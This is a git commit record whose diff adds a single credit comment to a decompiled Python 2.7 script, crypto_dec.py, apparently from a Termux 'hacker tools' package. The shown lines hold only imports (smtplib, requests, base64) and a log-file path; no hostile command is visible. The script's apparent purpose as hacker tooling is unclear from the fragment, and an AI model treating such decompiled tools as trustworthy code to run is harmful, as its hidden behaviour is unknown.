5763cd01e30f7def54bfd96f529e7ee935bc622e
Zen <52907264+Zen-Ezz@users.noreply.github.com>
2019-11-20 11:08:32 +0700

    Ok

--- crypto_dec.py
+++ crypto_dec.py
@@ -3,6 +3,7 @@
 # Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
 # [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
 # Embedded file name: <JustAHacker>
+# Source code from crazy tools sTamdatez
 import smtplib, os, sys, base64, random, time, requests
 try:
     file = '/data/data/com.termux/files/usr/etc/justahackers.log'
